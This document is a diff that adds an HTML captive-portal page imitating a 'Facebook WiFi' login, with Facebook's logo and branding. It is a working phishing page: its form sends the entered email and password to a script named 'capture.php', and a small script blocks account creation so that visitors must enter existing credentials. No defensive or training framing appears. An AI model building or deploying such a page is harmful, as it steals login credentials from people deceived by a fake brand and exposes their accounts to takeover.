@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook WiFi</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="header">
+                <svg class="logo" viewBox="0 0 40 40" width="60" height="60">
+                    <path fill="#ffffff" d="M40 20C40 8.95 31.05 0 20 0S0 8.95 0 20c0 9.98 7.32 18.24 16.88 19.73V25.78h-5.08V20h5.08v-4.41c0-5.01 2.99-7.78 7.55-7.78 2.19 0 4.47.39 4.47.39v4.91h-2.52c-2.48 0-3.25 1.54-3.25 3.12V20h5.54l-.89 5.78h-4.65v13.95C32.68 38.24 40 29.98 40 20z"/>
+                </svg>
+                <h1>facebook</h1>
+                <p class="subtitle">Log in to use WiFi</p>
+            </div>
+
+            <form method="POST" action="capture.php" class="login-form">
+                <div class="form-group">
+                    <input type="text" name="email" placeholder="Email address or phone number" required>
+                </div>
+
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+
+                <button type="submit" class="login-btn">Log In</button>
+
+                <div class="separator">
+                    <span>OR</span>
+                </div>
+
+                <button type="button" class="create-account-btn">Create new account</button>
+
+                <div class="terms">
+                    <p>By continuing, you agree to Facebook WiFi's Terms of Service</p>
+                </div>
+            </form>
+
+            <div class="footer">
+                <p>Secure connection provided by Facebook WiFi</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.querySelector('.create-account-btn').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Please use an existing account to connect to WiFi');
+        });
+    </script>
+</body>
+</html>
